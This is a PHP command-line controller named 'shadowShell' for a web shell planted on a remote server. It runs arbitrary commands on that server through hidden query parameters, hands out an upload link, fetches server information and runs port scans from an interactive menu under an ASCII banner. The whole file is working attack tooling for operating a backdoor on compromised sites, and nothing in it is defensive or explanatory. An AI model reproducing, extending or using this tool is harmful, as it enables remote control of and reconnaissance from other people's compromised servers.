<?php
error_reporting(0);
$url = $argv[1];
	
function curl($url){
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url."?Zeeday=MAKLO");
    $server_output = curl_exec ($ch);
    curl_close ($ch);
    return $server_output;
}

function curlexe($url,$cmd){
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url."?ZeedayExec=MAKLO&ZeedayCmd=$cmd");
    $server_output = curl_exec ($ch);
    curl_close ($ch);
    return $server_output;
}

function httpcode($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_TIMEOUT, 15);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_exec($ch);
  $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return $httpcode;
}

function service($ip,$port){
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $ip);
    curl_setopt($ch, CURLOPT_PORT, $port);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
if(!$argv[1]){
	echo "USAGE: php shadowShell.php http://example.com/shadow.php\n";
	exit();
}
$bannr = "
   _____ _   _   ___ ______ _____  _    _       
  /  ___| | | | / _ \|  _  \  _  || |  | |     
  \ `--.| |_| |/ /_\ \ | | | | | || |  | |     
   `--. \  _  ||  _  | | | | | | || |/\| |     
  /\__/ / | | || | | | |/ /\ \_/ /\  /\  / 
  \____/\_| |_/\_| |_/___/  \___/  \/  \/  
  /  ___| | | ||  ___| |    | |
  \ `--.| |_| || |__ | |    | |
   `--. \  _  ||  __|| |    | |
  /\__/ / | | || |___| |____| |____
  \____/\_| |_/\____/\_____/\_____/
  83 72 65 68 79 87  83 72 69 76 76
==========================================
 Connected: $url
==========================================
";
if(httpcode($url) == 200){
  while (1) {
	print("$bannr");
	print(" 1.Server Info 	 | 6.Exit\n");
	print(" 2.Upload File 	 | \n");
	print(" 3.Command	 | \n");
	print(" 4.Mass Port Scan|\n");
	print(" 5.Port Check 	 |\n");
	print("==========================================\n");
	print("Pilihan: ");
	$no = trim(fgets(STDIN, 1024));
	if($no == "1"){
  	  curl($url);
	}elseif($no == "2"){
   		echo "Upload Access: $url?ZeedayUP=MAKLO";
	}elseif($no == "3"){
		echo "Command: ";
		$cmd = trim(fgets(STDIN, 1024));
		curlexe($url,$cmd);
		echo "\n";
	}elseif ($no == "4"){
		echo "URL: ";
		$ip = trim(fgets(STDIN, 1024));
		echo "MAX PORT: ";
		$numb = trim(fgets(STDIN, 1024));
		for ($num = 1; $num <= $numb; $num++){
        	$ch = curl_init();
      		curl_setopt($ch, CURLOPT_URL, $ip);
      		curl_setopt($ch, CURLOPT_PORT, sprintf("%'.04d\n", $num));
      		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      		curl_exec($ch);
      		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
      		curl_close($ch);
      		if($httpcode == 0){
      		}else{
      			   print("$ip:$num HTTPCODE: $httpcode\n");
 	     		   service($ip,$num);
		      	 }
    	}
	}elseif ($no == "5"){
		  echo "URL: ";
		  $ip = trim(fgets(STDIN, 1024));
		  echo "PORT: ";
		  $port = trim(fgets(STDIN, 1024));
		  $ch = curl_init();
 		  curl_setopt($ch, CURLOPT_URL, $ip);
 		  curl_setopt($ch, CURLOPT_TIMEOUT, 15);
 		  curl_setopt($ch, CURLOPT_PORT, $port);
  		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	 	  curl_exec($ch);
 	 	  $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  		  curl_close($ch);
      	  if($httpcode == 200){
      			print("$ip:$port 200OK\n");
      			service($ip,$port);
      	  }else{
      	  	   print("HTTPCODE: $httpcode\n");
      	  	   service($ip,$port);
		    }
	}elseif($no == "6"){
		exit();
	}
	else{
		echo "Error!\n";
	}
 }
}else{
	print("\nHTTPCODE: ".httpcode($url));
	echo "\nSorry,We Can't Access Your File\n";
}
?>
